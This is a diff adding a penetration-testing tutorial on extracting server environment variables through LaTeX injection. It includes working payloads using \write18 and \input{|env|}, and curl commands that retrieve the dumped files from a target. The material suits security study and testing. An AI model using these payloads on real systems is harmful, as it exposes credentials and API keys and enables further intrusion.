@@ -1,0 +1,84 @@
+---
+title: Environment Variable Extraction via LaTeX Injection
+description: Learn to extract environment variables using LaTeX injection in web apps
+  for information disclosure.
+keywords:
+- Environment variables
+- LaTeX injection
+- Information disclosure
+- Command execution
+- Web application security
+- Sensitive data access
+- Environment enumeration
+- Vulnerability exploitation
+- Server configuration
+---
+
+# Environment Variable Extraction
+
+## Context
+
+The objective of this article is to demonstrate how environment variables can be extracted through LaTeX injection in web applications. This technique leverages LaTeX's capability to execute system commands, allowing for potential information disclosure. The reader is assumed to have knowledge of environment variables, LaTeX commands, web server configurations, and basic LaTeX Injection techniques.
+
+## Theory
+
+### Environment Variable Exposure via LaTeX Injection
+
+Environment variables are used to store sensitive configuration and runtime data necessary for server processes. LaTeX, a typesetting system, can execute system commands via the `\write18` feature if enabled. This capability can be exploited to access and leak environment variables on a server running a LaTeX interpreter. When a web application insufficiently sandboxes the LaTeX interpreter, attackers can inject LaTeX code to run commands like `env` or `printenv`, leading to the exposure of environment variables. An attacker typically injects LaTeX code to execute such commands, capturing the output and gaining access to sensitive data.
+
+### LaTeX Command Execution for Environment Extraction
+
+LaTeX allows for shell command execution using the `\write18{<command>}` syntax, provided that the command execution is enabled in the LaTeX environment. This feature is commonly misused when web applications pass user inputs directly to LaTeX without proper sanitization, permitting arbitrary command execution. Attackers might also use other LaTeX constructs such as `\input{|env|}` to avoid input filters and bypass sanitization.
+
+### Information Disclosure Impact
+
+The extracted environment variables can contain sensitive data such as credentials, API keys, and crucial internal configurations. This information disclosure can be detrimental, enabling further attacks like privilege escalation or lateral movement within a compromised network environment.
+
+## Practice
+
+### Extracting Environment Variables via `\write18` and `env`
+
+- Inject the payload into a vulnerable LaTeX input field to execute the `env` command:
+  ```latex
+  \immediate\write18{env > /tmp/env.txt}
+  ```
+  This code writes the environment variables to a temporary file named `env.txt`.
+
+- Trigger the LaTeX compilation to execute the injected command. If successful, the server will process the payload and run the command, storing the environment variable output in the specified file.
+
+- Retrieve the output file if it is web-accessible:
+  ```bash
+  curl http://<target>/files/env.txt
+  ```
+  This command allows you to download the dumped environment variables, providing access to potentially sensitive data.
+
+### Direct Environment Variable Disclosure via `\input{|env|}`
+
+- Inject the following LaTeX payload to include environment variable output directly in the compiled document:
+  ```latex
+  \input{|env|}
+  ```
+  This payload outputs the environment variables in the resulting document.
+
+- Submit the payload through the vulnerable web application's input field and trigger the document generation process. The compiled PDF or output document will contain the environment variable listing, exposing sensitive information directly.
+
+### Enumerating Environment Variables with `\write18{printenv}`
+
+- Use an alternative command to dump environment variables with the `printenv` command:
+  ```latex
+  \immediate\write18{printenv > /tmp/vars.txt}
+  ```
+  This command performs a similar function to `env`, redirecting the environment variables into a file named `vars.txt`.
+
+- Download the file containing the environment variables using:
+  ```bash
+  curl http://<target>/files/vars.txt
+  ```
+  By accessing this URL, you can gain insights into the server's environment configuration and any sensitive information stored within these variables.
+
+## Tools
+
+- **curl**
+- **pdflatex** 
+
+By rigorously following these steps, an attacker can effectively exploit LaTeX injection vulnerabilities to extract environment variables from web applications, potentially revealing critical sensitive information.
